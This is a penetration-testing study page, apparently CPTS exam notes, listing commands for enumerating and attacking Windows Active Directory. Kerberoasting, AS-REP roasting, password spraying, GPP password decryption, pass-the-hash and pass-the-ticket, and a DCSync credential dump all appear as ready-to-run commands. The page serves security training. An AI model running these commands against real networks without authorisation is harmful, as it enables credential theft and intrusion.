---
title: Active Directory Assessment & Exploitation
parent: CPTS
grand_parent: Categories
nav_order: 5
has_children: false
layout: default
---

# Active Directory Assessment & Exploitation

## Overview

This page focuses on techniques used to enumerate, assess, and exploit Windows Active Directory environments in internal network engagements.

---

## AD Enumeration (Unauthenticated)

### Host Discovery
```bash
nmap -sS -p 88,135,139,445,389,636,3268,5985 <target>
```

### SMB Enumeration
```bash
smbclient -L //<target>/ -N
nmap --script smb-enum-shares,smb-enum-users -p445 <target>
enum4linux-ng <target>
```

### LDAP Enumeration
```bash
ldapsearch -x -h <target> -s base
```

---

## AD Enumeration (Authenticated)

### CrackMapExec for Basic Info
```bash
crackmapexec smb <target>/24 -u <user> -p <pass>
```

### BloodHound Collection
```bash
neo4j console &
bloodhound-python -u <user> -p <pass> -dc <domain> -ip <target> -c all
```

Visualize with BloodHound GUI.

### Kerberoasting
```bash
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <target>
```
Crack with:
```bash
hashcat -m 13100 hash.txt rockyou.txt
```

### AS-REP Roasting
```bash
impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <target> -no-pass
```

---

## Exploiting AD Misconfigs

### Password Spraying
```bash
hydra -L users.txt -P passwords.txt <target> smb
```

### GPP Password Exploit (if found)
```bash
smbclient //target/SYSVOL -U <user>
# Navigate to GPP XML containing cpassword
```
Decrypt with:
```bash
gpp-decrypt <cpassword>
```

### Pass-the-Hash
```bash
crackmapexec smb <target> -u <user> -H <NTLM_hash>
```

### Pass-the-Ticket
```bash
export KRB5CCNAME=./ticket.ccache
python3 script.py -k -no-pass ...
```

---

## Privilege Escalation

### Find Domain Admin Paths (BloodHound)
- Use queries like "Shortest path to DA"

### Abuse Unconstrained Delegation
- Dump creds from memory after compromise

### DCSync Attack (if user has rights)
```bash
impacket-secretsdump <domain>/<user>:<pass>@<dc-ip>
```

---

## Notes
- Always test credentials across SMB, LDAP, WinRM
- Keep BloodHound up-to-date for query logic
- Focus on credential access, misconfig abuse, and lateral movement within AD scope
